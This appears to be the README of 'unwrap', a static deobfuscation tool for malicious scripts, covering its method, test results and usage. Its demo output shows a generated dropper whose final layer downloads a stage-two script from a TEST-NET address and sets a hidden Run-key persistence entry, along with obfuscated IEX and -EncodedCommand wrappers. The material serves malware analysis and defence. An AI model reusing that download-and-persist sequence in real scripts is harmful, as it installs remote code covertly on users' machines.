# unwrap

**Peel the obfuscation off malicious PowerShell, JavaScript, VBScript and batch, layer by layer, without ever running them.** Base64, gzip, XOR, `-EncodedCommand`, format strings, char codes, reversing, junk-replace, packers and Invoke-Obfuscation's tricks all come off, statically, and every layer stays on screen. Then it pulls out the IOCs and maps what the script does to MITRE ATT&CK. Pure Python standard library, zero dependencies.

[![ci](https://github.com/njuj/unwrap/actions/workflows/ci.yml/badge.svg)](https://github.com/njuj/unwrap/actions/workflows/ci.yml)
![python](https://img.shields.io/badge/python-3.10%2B-00ff9c?labelColor=0b0f17)
![deps](https://img.shields.io/badge/dependencies-0-00ff9c?labelColor=0b0f17)
![verified](https://img.shields.io/badge/verified_against-PowerShell_·_Node_·_cscript_·_cmd-00ff9c?labelColor=0b0f17)
![license](https://img.shields.io/badge/license-MIT-00ff9c?labelColor=0b0f17)

```text
$ unwrap examples/samples/dropper.bat

 unwrap v0.1.0  ·  dropper.bat  ·  7 layer(s)  ·  35 rewrite(s)  ·  0.02s

 LAYER 0  batch  ·  3,658 chars  ·  rewrites: caret-escapes ×1, variable-expansion ×3
   @echo off set v077=p set v182=owe set v261=rshell call powershell -nop -w hidden -enc JgAoACAAJABzAEgAZQBsAEwASQBkAFsAMQBdACsAJABzAGgARQBsAEwAaQBEAFsAMQAzAF0...
   └ decoded: encoded-command  ·  -EncodedCommand: Base64 of UTF-16LE (3,568 chars)

 LAYER 1  powershell  ·  1,301 chars  ·  rewrites: automatic-variable ×2, index ×2, concatenation ×2, parentheses ×2, invoke-alias ×1
   iex '.( $pShoMe[21]+$psHomE[30]+''X'') (-join ([Convert]::FromBase64String(''MhUNFBAeVj4DGwsJHhsIGwgbEhsUFVtTUzUeDFY0GREeGA9bMjRVKA8JHhoWKR4aHx4JU1M1HgxWNBkR...
   └ decoded: invoke-expression  ·  Invoke-Expression of a literal

 LAYER 2  powershell  ·  1,263 chars  ·  rewrites: automatic-variable ×2, index ×2, concatenation ×1, parentheses ×1, invoke-alias ×1
   ieX (-join ([Convert]::FromBase64String('MhUNFBAeVj4DGwsJHhsIGwgbEhsUFVtTUzUeDFY0GREeGA9bMjRVKA8JHhoWKR4aHx4JU1M1HgxWNBkRHhgPWzI0VTgUFgsJHggIEhQVVT8eHRcaDx4o...
   └ decoded: xor  ·  Base64 -> XOR with 0x7b

 LAYER 3  powershell  ·  884 chars  ·  rewrites: backtick ×5
   Invoke-Expression ((New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('XVRLblsxDLxKVo0NsIAoUb8...
   └ decoded: deflate-base64  ·  Base64 -> raw deflate (497 -> 1,190 bytes)

 LAYER 4  powershell  ·  320 chars  ·  rewrites: char-array ×1, parentheses ×2, invoke-alias ×1
   IEX '&(''IEX'') ((''{1}{0}'' -f ''CU:\Software\Microsoft\Windows\CurrentVersion\Run'''' -Name Updater -Value "powershell -w hidden -f $d"'',''$u = ''''http:/...
   └ decoded: invoke-expression  ·  Invoke-Expression of a literal

 LAYER 5  powershell  ·  274 chars  ·  rewrites: format-operator ×1, parentheses ×2, invoke-alias ×1
   IEX '$u = ''http://203.0.113.50/update/stage2.ps1'' $d = "$env:APPDATA\Microsoft\svchost.ps1" (New-Object Net.WebClient).DownloadFile($u, $d) New-ItemPropert...
   └ decoded: invoke-expression  ·  Invoke-Expression of a literal

 FINAL  powershell  ·  255 chars  ·  rewrites: constant-variable ×2
   $d = "$env:APPDATA\Microsoft\svchost.ps1"
   (New-Object Net.WebClient).DownloadFile('http://203.0.113.50/update/stage2.ps1', $d)
   New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value "powershell -w hidden -f $d"

 INDICATORS
   urls      hxxp://203[.]0[.]113[.]50/update/stage2.ps1
   ips       203[.]0[.]113[.]50
   paths     $env:APPDATA\Microsoft\svchost.ps1
   registry  HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

 BEHAVIOUR
   T1105      downloads content from the network  → (New-Object Net.WebClient).DownloadFile('http://203.0.113.50/update/stage2.ps1', $d)
   T1059      executes code it built at run time  → IEX '$u = ''http://203.0.113.50/update/stage2.ps1''
   T1140      decodes data at run time  → ...flateStream([IO.MemoryStream][Convert]::FromBase64String('XVRLblsxDLxKVo0NsIAoUb8DdJEbB
   T1547.001  writes an autorun registry key  → ...'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value "powershell 
   T1564.003  hides its window  → ...-Name Updater -Value "powershell -w hidden -f $d"

 stopped: nothing left to decode
```

A batch file hides `powershell` in `set` variables and carets and passes an `-EncodedCommand`. Inside: an IEX spelled out of `$PSHome[21]+$PSHome[30]+'x'`, Invoke-Obfuscation style, running an XOR'd blob, which inflates a deflate stream, which builds a `[char[]]` array, which is a shuffled `-f` format string. Seven layers later: the download URL, the drop path and the Run-key persistence, with the variable `$u` folded into the download call. `$d` stays a variable on purpose: `"$env:APPDATA\..."` is only known at run time, and unwrap never guesses.

The sample is harmless and generated (`python examples/make_samples.py`, which also writes a JScript loader and a VBScript macro): its address is TEST-NET and nothing in it is meant to run.

## How it works

Each layer goes through two kinds of step, and neither one executes anything:

* **Rewrites** evaluate small expressions made only of literals and write the result back as a literal: `'Inv'+'oke'` becomes `'Invoke'`, `[char]73` becomes `'I'`, `("{1}{0}" -f 'b','a')` becomes `'ab'`. They run to a fixed point, so `('{0}{1}' -f ('a'+'b'), [char]99)` collapses completely.
* **Decoders** recognise a whole wrapper (`-EncodedCommand`, Base64 + gzip, `iex '...'`, `eval(...)`, `Execute ...`) and hand the hidden script on as the next layer. A wrapper that *runs* code also fixes the next layer's language. When `Execute()` peels a layer, that layer is VBScript, even if it mentions `powershell -nop` all over.

Two details carry most of the weight:

* **Literal awareness.** Nested layers live inside string literals of the outer layer. A rewrite that folded `[char]73` *inside* `'...[char]73...'` would corrupt the outer quoting, so every rewrite and decoder skips matches that start or end inside a literal. The literal patterns are unrolled loops that never open on the second half of an escape (`''`, `` `" ``, `\'`, `""`), so they stay linear on megabyte-sized hostile input.
* **Faithful semantics, checked against the real thing.** `-replace` is a case-insensitive regex, while `.Replace()` is a literal and case-sensitive. `$ShellId`, `$PSHome`, `$env:ComSpec`, `$env:Public` and `$VerbosePreference` are only substituted where they are indexed, because only those values are the same on every Windows machine. A variable is folded only when it is assigned once, and never into an expandable `"...$x..."` string. Its assignment is dropped only when nothing else (`${x}`, `$script:x`) still refers to it.

## What it peels

| | Rewrites (folded in place) | Decoders (next layer) |
|---|---|---|
| **PowerShell** | backtick escapes (but not `` `n `` `` `t ``…), `[char]N`, `[char[]](…) -join`, `-join [char[]]`, `%{[char]$_}`, `[string]::Join`, `-f` format strings, `+` concatenation, `-join` lists, `[-1..-n]` reversal, `-replace` / `-creplace` / `.Replace()`, string indexing, constant variables, here-strings, `&('iex')` / `.("New-Object")`, Invoke-Obfuscation IEX spellings (`$ShellId[1]+$ShellId[13]+'x'`, `$env:ComSpec[4,15,25]-Join''`, `(gv '*mdr*').Name[3,11,2]-Join''`, …) | `-EncodedCommand` (every abbreviation), `[Text.Encoding]::X.GetString(FromBase64String)`, `GzipStream` / `DeflateStream`, `-bxor`, `iex` / `Invoke-Expression` / `\| iex`, `[ScriptBlock]::Create`, `$ExecutionContext.InvokeCommand`, `powershell -Command` |
| **JavaScript** | `String.fromCharCode`, `atob`, `unescape` / `decodeURI(Component)`, `\x` `\u` `\u{}` escapes, concatenation, `split('').reverse().join('')`, `replace` / `replaceAll` (string and regex) | `eval`, `Function(…)()`, `document.write`, Dean Edwards' `p,a,c,k,e,d` packer |
| **VBScript** | `Chr` / `ChrW` (`&H`), `vbCrLf` & co, `&` / `+` concatenation, `StrReverse`, `Replace` | `Execute`, `ExecuteGlobal`, `Eval` |
| **Batch** | `^` carets, `set` + `%var%` / `%var:~start,len%` expansion | (hands `powershell -enc` to the PowerShell decoders) |
| **Any** | | long Base64 or hex literals. Text becomes the next layer; a PE, ELF, ZIP, PDF, gzip or OLE payload is reported as an artifact with its SHA-256 |

## Proof that it works

### 1. Round trip: obfuscate, unwrap, demand the exact original

[`tests/obfuscator.py`](tests/obfuscator.py) goes the other way. It wraps harmless payloads in 22 techniques (10 PowerShell, 8 JavaScript, 4 VBScript), plus a batch launcher. The payloads contain the characters that make quoting hard: both quotes, backticks, `$`, braces and line breaks. Because every technique maps code to code, they stack in any order, and unwrap has to hand back the payload **character for character**.

| Check | Cases | Exact payload back |
|---|---:|---:|
| every technique alone × every payload × 8 seeds | 864 | 864 |
| random stacks, 2 to 5 layers deep, three languages | 9,000 | **9,000** |
| batch launchers around PowerShell stacks | 40 | 40 |
| Invoke-Obfuscation launchers (`&$spelled (…)`, `(…) \| .$spelled`) | 400 | 400 |

### 2. Differential: the real interpreters agree with the obfuscator

A round trip alone could be a closed loop, where the obfuscator and unwrap agree with each other and both are wrong. So [`tests/test_interpreters.py`](tests/test_interpreters.py) hands the obfuscator's output to the real interpreters. Only the string-building half runs: the "execute it" wrapper (`iex`, `eval`, `Execute`, `call`) is swapped for a print, so the interpreter computes the hidden code and returns it as data. The payloads are never run.

| Interpreter | Expressions evaluated | Disagreements |
|---|---:|---:|
| Windows PowerShell 5.1 | 654 | **0** |
| Node.js | 384 | **0** |
| Windows Script Host (`cscript`) | 192 | **0** |
| `cmd.exe` (`set` / `%var%` / `^`) | 60 | **0** |
| Invoke-Obfuscation IEX spellings, on a real Windows machine | 14 distinct | **0** (all spell `iex`) |

In CI, the same tests run on Linux and macOS against PowerShell 7 (`pwsh`) and Node.js.

The differential run caught a bug in the harness itself (line breaks written twice). Real PowerShell also settled a semantic question: in 5.1, `` Writ`e-Output `` runs as `Write-Output`, while `` a`nb `` is a line break *even unquoted*. The backtick rule follows that behaviour, not a guess.

### 3. Hostile input

| Check | Result |
|---|---|
| fuzzing: 30,000 randomly mutated multi-layer samples | **0 crashes**, slowest 0.62 s |
| 5 MB random Base64 literal | 3.7 s |
| 1 MB of unbalanced quotes / an unterminated 1 MB string | 1.0 s / 0.7 s |
| 200,000-term `'a'+'a'+…` chain · 100,000 `[char]` · 100,000 `Chr()` | 1.1 s · 0.9 s · 0.6 s |
| a 100 KB variable used 2,000 times (200 MB if propagated) | 0.12 s: propagation is capped at 1 MB of growth |
| decompression bomb | refused above 50 MB inflated |
| layers · rewrite passes · input size | capped at 32 · 200 · 20 MB |

Fuzzing found one real crash: malformed JavaScript escapes (`\u{}`, `\9`, a lone `\x`) made the escape decoder raise. They now decode the way JavaScript decodes them. Timing found two more problems. An unterminated run of `''` escapes cost O(n²) (8,000 of them took 14.6 s, now 0.06 s), and a variable that would have grown to 200 MB made unwrap hang. Both are fixed and covered by tests.

## Usage

```bash
pip install git+https://github.com/njuj/unwrap

unwrap suspicious.ps1                       # a script
unwrap -c "powershell -nop -enc SQBFAFgA..."   # a command line from a log or an EDR alert
unwrap - < dropper.txt                      # stdin (UTF-8 or UTF-16)
unwrap loader.js --full                     # every layer in full, not a preview
unwrap macro.vbs --layers-dir layers/       # each layer written to layers/layer-NN.txt
unwrap dropper.bat --json | jq .final       # machine-readable, for pipelines
```

| Option | |
|---|---|
| `--full` | print every layer in full |
| `--layers-dir DIR` | write each layer to `DIR/layer-NN.txt` |
| `--json` | layers, decoders, artifacts, indicators and behaviours as JSON |
| `--no-defang` | print indicators live (they are defanged by default: `hxxp://203[.]0[.]113[.]50/…`) |
| `--max-layers N` | stop after N layers (default 32) |
| `--no-color` | plain output (also when `NO_COLOR` is set or output is not a terminal) |

Exit codes: `0` done, `2` the input could not be read.

As a library:

```python
from unwrap import unwrap

result = unwrap(open("dropper.ps1", encoding="utf-8").read())
print(result.final)                       # the innermost layer
for layer in result.layers:               # every layer, with its language, rewrites and decoder
    print(layer.index, layer.language, layer.decoded_by and layer.decoded_by.technique)
```

## Limits, plainly

* unwrap evaluates expressions built from **literals**. Values that come from the environment, files, the network or user input are unknown, apart from the few automatic variables that are the same on every Windows machine. It shows such code as it is and does not guess.
* It works on patterns and a literal-aware tokenizer, not a full parser for four languages. Exotic syntax can leave a layer partly folded. That layer is still printed, so nothing is hidden.
* It does not try to recover keyed encryption (AES, RC4, custom loops). A binary payload is reported with its SHA-256 so you can pivot on it.
* Constant propagation is deliberately conservative: one assignment, at most 1 MB of growth.

## Safety

unwrap never executes, imports or evaluates the input, and it never touches the network. Indicators are defanged unless you ask otherwise. The test suite runs real interpreters only on string-building expressions with harmless payloads. Dropper-shaped samples are generated on demand rather than committed, so the repository itself stays quiet under antivirus scanning.

## License

MIT
